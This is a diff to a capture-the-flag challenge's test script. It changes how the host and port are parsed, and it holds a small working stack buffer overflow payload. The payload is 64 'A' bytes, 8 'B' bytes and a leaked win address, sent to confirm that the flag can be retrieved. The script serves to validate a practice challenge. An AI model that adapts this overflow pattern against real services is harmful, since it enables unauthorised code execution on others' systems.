@@ -10,9 +10,11 @@ context.log_level = 'error'
 def run_test(flag, connection_string=None, handout_path=None, deployment_path=None):
     result = {}
     connection_string = connection_string[0] # We only have a single connection string
+    host = connection_string.split(" ")[1]
+    port = connection_string.split(" ")[2]
 
     # If the challenge is in good working order (DEPLOYMENT_WORKING)
-    p = remote(connection_string.split(":")[0], int(connection_string.split(":")[1]))
+    p = remote(host, int(port))
     if "Welcome to the CTF challenge!" in p.recvline().decode('ascii'):
         result["DEPLOYMENT_WORKING"] = ""
     else:
@@ -23,7 +25,7 @@ def run_test(flag, connection_string=None, handout_path=None, deployment_path=No
     if result["DEPLOYMENT_WORKING"]:
         result["FLAG_CORRECT"] = "Unable to check flag"
     else:
-        p = remote(connection_string.split(":")[0], int(connection_string.split(":")[1]))
+        p = remote(host, int(port))
         match = re.search(r"Win @ (0x[0-9a-fA-F]+)", p.recvline().decode("ascii"))
         p.sendline(b'\x41'*64 + b'\x42'*8 + bytes.fromhex(match.group(1)[2:])[::-1])
         output = p.recvall()
